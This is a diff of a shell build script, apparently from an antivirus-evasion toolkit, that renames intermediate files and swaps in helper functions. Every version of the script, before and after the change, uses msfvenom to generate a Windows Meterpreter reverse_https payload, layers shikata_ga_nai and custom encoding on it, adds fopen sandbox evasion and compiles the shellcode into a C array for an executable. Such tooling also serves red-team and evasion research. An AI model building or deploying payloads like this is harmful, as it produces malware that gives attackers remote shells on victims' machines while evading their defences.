@@ -17,21 +17,19 @@ LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
 
 # make meterpreter reverse payload, encoded with shikata_ga_nai
-# additionaly to the avet encoder, further encoding should be used
-msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc.txt
+msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > input/sc_c.txt
 
 # encode the shellcode via AVET encoding.
-# AVET encoding is applied via format.sh tool
-./tools/format.sh input/sc.txt > input/scclean.txt
+encode_shellcode avet input/sc_c.txt input/scenc_raw.txt
 
 # add fopen sandbox evasion
 add_evasion fopen_sandbox_evasion
 
 # convert encoded shellcode file to c array style for static include
-./tools/data_raw_to_c/data_raw_to_c input/scclean.txt input/scenc.txt buf
+./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
 
 # set shellcode source
-set_shellcode_source static_from_file input/scenc.txt
+set_shellcode_source static_from_file input/scenc_c.txt
 
 # set decoder and key source
 # AVET decoder needs no key
